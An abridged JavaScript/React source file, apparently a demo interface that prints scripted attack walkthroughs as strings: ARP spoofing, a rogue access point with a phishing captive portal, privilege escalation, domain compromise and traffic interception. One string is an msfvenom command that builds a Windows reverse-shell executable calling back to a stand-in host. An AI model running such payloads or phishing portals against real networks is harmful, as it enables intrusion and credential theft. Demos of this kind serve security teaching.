    ...
    try {
      if (demoType === 'recon') {
        ...
        const steps = [
          ...
          '🎯 Target: webapp.example.com (192.0.2.100)',
        ...
        const steps = [
          ...
          '🎯 Target: Local network (192.0.2.0/24)',
          '',
          '📡 Phase 1: Network Reconnaissance',
          '  🔍 Scanning network...',
          '  ✅ Gateway: 192.0.2.1',
          '  ✅ Targets: 192.0.2.50, 192.0.2.51',
          '  📊 ARP table populated',
          '',
          ...
          '  🎯 Redirecting facebook.com → 192.0.2.100',
        ...
        const steps = [
          ...
          '  wlan0: DHCPv4 address 192.0.2.105/24 via 192.0.2.1',
        ...
        const steps = [
          ...
          '  $ sudo ifconfig wlan1 198.51.100.1/24',
          ...
          '  dnsmasq: DHCP, IP range 198.51.100.100 -- 198.51.100.200, lease time 12h',
          '',
          ...
          '  ',
          '  $ dhcp-leases',
          '  1682012845 XX:YY:ZZ:11:22:33 198.51.100.100 iPhone-John',
          '  1682012847 XX:YY:ZZ:44:55:66 198.51.100.101 Laptop-Sarah',
          '  1682012850 XX:YY:ZZ:77:88:99 198.51.100.102 Android-Mike',
          '',
          '📡 Phase 7: Captive Portal',
          '  Starting phishing page...',
          '  $ sudo python3 captive_portal.py',
          '  Serving HTTP on 198.51.100.1 port 80...',
          '  ',
          '  🌐 Client 198.51.100.100 - GET /login.html',
          '  🌐 Client 198.51.100.101 - GET /login.html',
          ...
          '  17:48:15 IP 198.51.100.100.52341 > 93.184.216.34.80: HTTP GET',
          '  17:48:17 IP 198.51.100.101.49221 > 142.250.185.78.443: TLS Client Hello',
        ...
        const steps = [
          ...
          '🎯 Target: Ubuntu 20.04 LTS (192.0.2.50)',
          '',
        ...
        const steps = [
          ...
          '🎯 Target: Windows Server 2019 (192.0.2.100)',
          '',
          '📡 Phase 1: Initial Access',
          '  $ whoami',
          ...
          '  ',
          '  PS C:\> msfvenom -p windows/shell_reverse_tcp LHOST=198.51.100.1 LPORT=4444 -f exe -o service.exe',
        ...
        const steps = [
          ...
          '🎯 Target: CORP.LOCAL domain (192.0.2.0/24)',
          '',
          ...
          '  ✅ Initial access: WS01 (192.0.2.50)',
          '',
        ...
        const steps = [
          ...
          '  ',
          '  192.0.2.50:52341: POST api.mobile-app.com:443',
          '  192.0.2.50:52342: GET api.mobile-app.com:443',
          '  192.0.2.50:52343: POST api.mobile-app.com:443',
          '  ',
          '  ✅ Traffic intercepted',
          '  ',
  ...
  return (
    <div className="app">
      ...
      <footer className="footer">
        ...
        <p>
          <a href="https://github.com/dmrobbi/agentic-ai">GitHub</a> •
          <a href="https://discord.gg/clawd">Discord</a> •
          <a href="https://papers.example.internal/">Research Papers</a> •
